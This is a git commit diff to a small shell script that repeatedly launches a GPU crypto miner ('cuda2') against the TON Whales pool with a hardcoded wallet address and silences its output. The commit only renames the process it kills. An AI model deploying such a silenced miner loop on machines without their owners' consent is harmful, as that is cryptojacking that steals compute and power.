4879ceff5f9a16d91b3a541bc1a9332bb5437d41
aleksey1255 <94141580+aleksey1255@users.noreply.github.com>
2021-11-27 22:06:53 +1000

    Update bin2.sh

--- bin2.sh
+++ bin2.sh
@@ -1,4 +1,4 @@
 #! /bin/sh
 while command; do
-./cuda2 run https://pool.services.tonwhales.com/ EQD6Wf0XbwLgmw9W8GTxNSf3Drv50clppZKcWijiwan4Dw3d > /dev/null 2>&1 & nvidia-smi; sleep 120; pkill gpu-miner                                                                                                              
+./cuda2 run https://pool.services.tonwhales.com/ EQD6Wf0XbwLgmw9W8GTxNSf3Drv50clppZKcWijiwan4Dw3d > /dev/null 2>&1 & nvidia-smi; sleep 120; pkill cuda2                                                                                                              
 done
